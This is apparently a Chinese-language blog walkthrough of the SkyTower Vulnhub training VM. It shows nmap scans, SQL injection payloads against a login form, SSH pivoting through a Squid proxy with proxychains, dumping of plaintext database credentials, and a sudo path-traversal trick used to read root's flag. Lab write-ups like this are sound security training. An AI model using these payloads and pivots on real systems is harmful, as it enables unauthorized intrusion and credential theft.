---
title: "SkyTower Vulnhub靶场复现-重走来时路3"
description: "大一最后自己打的靶场，还是有点难度的"
slug: "vulnhub-skytower"
pubDate: "2026-07-19"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# SkyTower Vulnhub靶场复现-重走来时路 3

## 注意事项

靶场地址 https://vulnhub.com/entry/skytower-1,96/

下载地址 https://download.vulnhub.com/skytower/SkyTower.zip

SkyTower 下载后的虚拟机文件无法直接导入 VMware。可以先在 VirtualBox 中导入，再导出为 OVA 格式，之后即可在 VMware 中正常导入

启动靶场虚拟机介绍

Welcome to the SkyTower, try to gain access
to the flag.txt file in the /root/ directory

## 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

得知 10.10.10.132 为 skytower 靶机ip地址

## 端口扫描

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/SkyTower]
└─$ sudo nmap --min-rate 1000 -p- 10.10.10.132
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 12:34 -0400
Nmap scan report for 10.10.10.132
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
┌──(kali㉿kali)-[~/Labs/Vulnhub/SkyTower]
└─$ sudo nmap -sT -sV -sC -O -p 22,80,3128 10.10.10.132
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 12:35 -0400
Nmap scan report for 10.10.10.132
Host is up (0.00068s latency).
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.20
MAC Address: 00:0C:29:A7:6A:77 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
Network Distance: 1 hop
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

| 端口     | 状态     | 服务       | 版本                   | 备注                       |
| -------- | -------- | ---------- | ---------------------- | -------------------------- |
| 22/tcp   | filtered | SSH        | -                      | 防火墙过滤，无法直接访问   |
| 80/tcp   | open     | HTTP       | Apache 2.2.22 (Debian) | 主要攻击面                 |
| 3128/tcp | open     | HTTP Proxy | Squid 3.1.20           | 可用于绕过防火墙的代理服务 |

22端口被过滤的可能是nmap 发送的包直接被防火墙拦截，没有返回rst包，若想利用 SSH 服务，需要先绕过防火墙对 22 端口的访问限制

3128 Squid 代理 是一个http正向代理，如果靶机允许本地回环地址访问22端口，我们就可以通过修改proxychain去绕过这个22端口的过滤

## 漏洞扫描

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/SkyTower]
└─$ sudo nmap --script=vuln -p22,80,3128 10.10.10.132
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 12:38 -0400
Nmap scan report for 10.10.10.132
Host is up (0.00087s latency).
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
| http-enum:
|_  /login.php: Possible admin folder
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.132
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.10.10.132:80/
|     Form id:
|_    Form action: login.php
| http-sql-injection:
|   Possible sqli for forms:
|     Form at path: /, form's action: login.php. Fields that might be vulnerable:
|_      email
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3128/tcp open     squid-http
```

访问 80 端口是一个登陆表单，爆出可能存在两个漏洞，sql注入和csrf

## 先测试sql注入的可能以及原因

sql注入不需要登陆，可以直接通过登录框进行渗透

csrf 是跨站请求伪造，利用需要有两大条件

1. 必须先有一个有效的登陆会话，cookie/session
2. 目标应该有修改密码的操作，且没有csrf token的保护

既然明确了，我们先测试sql注入的可能，若 SQL 注入暂未获得进一步突破，可以重新回到信息收集阶段，对 Web 服务继续进行枚举

## SQL注入测试

对80端口进行抓包,然后发送到重放器

```text
POST /login.php HTTP/1.1
Host: 10.10.10.132
Content-Length: 18
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://10.10.10.132
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.132/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

email=1&password=1
```

```text
HTTP/1.1 200 OK
Date: Mon, 20 Jul 2026 01:20:01 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.4-14+deb7u9
Vary: Accept-Encoding
Content-Length: 21
Connection: close
Content-Type: text/html

<br>Login Failed</br>
```

修改Email 的参数进行测试

参数如下

```text
admin'# 显示登陆失败

'or '1'=1# 显示There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1' and password='1'' at line 1]

1' 依旧语法错误There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1]

'AND'1'LIKE'1' There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1]

'a' 依旧如上

1||1登陆失败

1||1=1 登陆失败

admin'AND1=1# 语法错误

1' -- - 语法错误

admin'||1=1 登陆成功

```

为什么最后的payload能成功，猜测 ' - -- AND OR = NOT 均被过滤

```sql
SELECT * FROM users WHERE email = '$_POST['email']' AND password = '$_POST['password']'
```

根据登录逻辑推测，其后端 SQL 查询语句类似于：

把admin‘||1=1# 替换进去

原始语句

```sql
SELECT * FROM users WHERE email = 'admin'|| 1=1 #' AND password = '1'
```

解析成

```sql
SELECT * FROM users WHERE email = 'admin'|| 1=1
```

返回请求如下

```text
**Welcome john@skytech.com

**As you may know, SkyTech has ceased all international operations.

To all our long term employees, we wish to convey our thanks for your dedication and hard work.

**Unfortunately, all international contracts, including yours have been terminated.**

The remainder of your contract and retirement fund, **$2** ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.

**Username: john**
**Password: hereisjohn**

We wish you the best of luck in your future endeavors.
```

```text
**欢迎联系 john@skytech.com

**如您所知，SkyTech 已经停止了所有国际业务活动。

致我们所有长期工作的员工，感谢你们的奉献精神和辛勤工作。

**不幸的是，包括您的合同在内的所有国际合同都已经终止了。**

您剩余合同期限内的款项以及退休基金$2 已经全额转入一个安全的账户中。出于安全考虑，您必须通过 SSH 登录到 SkyTech 服务器，才能访问账户信息。

**用户名：john**
**密码：hereisjohn**

祝你在未来的事业中取得圆满成功
```

到目前为止，不需要扫描目录，根据提示现在ssh登陆试试

## 注入成功获得提示，需要利用22端口ssh登陆

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/SkyTower]
└─$ ssh john@10.10.10.132
```

无响应，根据之前nmap的端口扫描显示22端口过滤，是正常的

先对3128端口进行了解，以下源于百度

```markdown
3128 端口是‌**Squid HTTP 代理服务器的默认监听端口**‌，主要用于‌**客户端请求转发、缓存加速及流量过滤**‌。‌‌

- ‌**核心用途**‌：作为 Squid 代理服务的标准通信接口，承担 HTTP/HTTPS 请求的中转、缓存存储及访问控制执行 。
- ‌**典型场景**‌：企业内网代理、网页缓存加速、隐藏客户端真实 IP、批量数据采集及网络访问审计 。
- ‌**技术特性**‌：相比 8080 端口，3128 被定义为代理专用标准端口，防火墙拦截率较低，稳定性与并发承载能力更强 。
- ‌**安全注意**‌：因特征明显，常被扫描工具用于探测开放代理资源；若未配置访问控制列表（ACL），可能导致非法匿名访问风险 。‌‌

该端口号可在 Squid 配置文件（`squid.conf`）中通过 `http_port` 指令自定义修改，并非强制固定 。‌‌

攻击者利用方式

1. ‌**未授权代理滥用**‌：若 Squid 配置为`http_access allow all`且无认证，攻击者可将其作为‌**开放代理**‌，匿名发起攻击、爬取数据或绕过 IP 封禁，导致源服务器日志仅记录代理 IP 而非攻击者真实身份 。
2. ‌**内网横向移动**‌：利用该代理作为‌**跳板**‌，扫描和访问原本无法直接触及的内网资源（如数据库、管理后台），实现“漫游内网”。
3. ‌**弱口令接管**‌：若开启管理接口或存在默认弱口令（如 admin/admin），攻击者可登录后台修改配置、上传 WebShell 或执行系统命令 。
4. ‌**漏洞利用**‌：针对特定 Squid 版本的历史漏洞（如远程代码执行、信息泄露）进行攻击，获取服务器控制权
```

## 利用3128端口当跳板，尝试ssh登陆

以上操作需要对kali和Linux操作熟悉

```shell
printf "strict_chain\nproxy_dns\n[ProxyList]\nhttp 10.10.10.132 3128\n" > /tmp/sky_proxy.conf
```

```shell
proxychains4 -f /tmp/sky_proxy.conf ssh john@10.10.10.132 -t "/bin/sh"
```

再输入一个密码

获得shell

### 第一次打这个靶场，在这里遇到的问题

之前是

```shell
┌──(root㉿kali)-[~]
└─# proxychains ssh john@192.168.108.132
...
john@192.168.108.132's password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
...
Funds have been withdrawn
Connection to 192.168.108.132 closed.
```

登录成功但立即退出，提示 `Funds have been withdrawn`。这表明登录脚本（如 `.bashrc` 或 `.profile`）中包含自动退出的指令。

尝试直接执行命令获取信息（成功执行但无交互）：

```shell
┌──(root㉿kali)-[~]
└─# proxychains ssh john@192.168.108.132 "grep ^john /etc/passwd"
john:x:1000:1000:john,,,:/home/john:/bin/bash
```

`-t` 强制分配伪终端，`"/bin/sh"` 指定启动 `/bin/sh`（而不是默认的 bash）。

加了这两个参数后：SSH 登录后会直接执行 `/bin/sh`，而不会 去执行 `.bashrc` 文件里的 `exit` 命令。这样你就能稳稳地留在这个 Shell 里，不被踢出去。

可以进行验证

```shell
cat ~/.bashrc
```

接着最下方的exit是罪魁祸首

## 先尝试提权--失败

### 先尝试sudo提权

```shell
$ sudo -l
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
#1) Respect the privacy of others.
#2)Think before you type.
#3) with great power comes great responsibility.
[sudo] password for john:
Sorry, user john may not run sudo on SkyTower.
```

失败

### 再尝试suid提权

```shell
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudoedit
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/bin/su
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
```

没有特殊的文件

## 重新信息收集查看网站源码

```shell
$ cd /var/www
$ ls
background2.jpg  background.jpg  index.html  login.php
$ cat login.php
```

随后发现里面隐藏敏感信息

```php
$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
```

- 数据库主机：`localhost`
- 用户名：`root`
- 密码：`root`
- 数据库名：`SkyTech`

## 进行数据枚举获取其他用户信息

```shell
$ mysql -uroot -proot
Welcome to the MySQL monitor...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+
mysql> use SkyTech;
mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+
mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
3 rows in set (0.00 sec)
```

**新发现的两个系统用户及密码**：

- `sara`：`ihatethisjob`
- `william`：`senseable`

## 横向移动到 sara 用户

使用代理 SSH 以 sara 身份登录，或者在这个终端使用sudo sara 在这里使用方法二

```shell
$ su sara -s /bin/sh
Password:
$ whoami
sara
```

密码是ihatethisjob

## 再次进行sudo提权

```shell
$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=...

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

用户sara可以不需要密码执行cat 和ls 命令

## 获取root目录下的flag

```shell
$ sudo ls /accounts/../
accounts  bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
$ sudo ls /accounts/../root
flag.txt
$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

## 总结

### 攻击路径回顾

1. **信息收集**：发现 80 端口 Web 服务和 3128 端口 Squid 代理。
2. **SQL 注入**：利用登录页面的注入漏洞获取 john 用户的 SSH 密码。
3. **代理绕过**：通过 Squid 代理配置 `proxychains`，绕过防火墙对 22 端口的限制。
4. **绕过登录脚本**：使用 `-t "/bin/sh"` 获得 john 的交互式 Shell。
5. **数据库枚举**：从 Web 源码中获取数据库凭证，查询到 sara 和 william 的密码。
6. **横向移动**：切换到 sara 用户，发现其 sudo 权限。
7. **权限提升**：利用 sara 的 sudo 路径遍历漏洞读取 root 目录，获取 root 密码。
8. **最终提权**：切换至 root 用户，完成渗透。

### 关于 SSH 退出的说明

经检查，`/home/john/.bashrc` 中包含导致自动退出的命令。使用 `-t "/bin/sh"` 启动 shell 可避免加载用户配置文件，从而绕过此限制。生产环境中，应避免在登录脚本中执行可能中断会话的操作。

### 本靶场涉及知识点

✔ Nmap信息收集

✔ SQL注入

✔ Burp Suite

✔ Squid代理

✔ Proxychains

✔ SSH

✔ 数据库枚举

✔ Linux横向移动

✔ sudo配置错误

✔ 路径遍历
